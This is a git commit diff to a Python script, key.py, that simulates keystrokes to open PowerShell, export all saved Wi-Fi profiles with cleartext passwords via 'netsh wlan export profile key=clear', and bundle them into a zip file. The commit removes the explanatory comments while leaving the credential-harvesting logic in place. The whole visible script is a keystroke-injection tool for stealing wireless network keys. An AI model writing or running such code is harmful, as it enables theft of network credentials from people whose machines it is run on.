d48622febb370a2c4c3843ffc054f016e1c47baa
woekie07 <82092453+woekie07@users.noreply.github.com>
2021-09-17 13:43:14 +0200

    Update key.py

--- key.py
+++ key.py
@@ -3,13 +3,13 @@ import time
 
 keyboard = Controller()
 
-# pressing the Windows Key + r 
+
 keyboard.press(Key.cmd)
 keyboard.press('r')
 keyboard.release(Key.cmd)
 keyboard.release('r')
 
-# opening Powershell
+
 time.sleep(0.5)
 keyboard.type('powershell')
 
@@ -17,7 +17,7 @@ time.sleep(0.5)
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
 
-#Export wlan profiles into xml files (including clear-test PSK's) into current directory
+
 time.sleep(0.5)
 keyboard.type('netsh wlan export profile key=clear')
 
@@ -25,8 +25,7 @@ time.sleep(0.5)
 keyboard.press(Key.enter)
 keyboard.release(Key.enter)
 
-#Collect all xml files into a single zip file
-time.sleep(0.5)
+
 keyboard.type('Compress-Archive -U -Path .\*.xml -DestinationPath temp.zip')
 
 time.sleep(0.5)
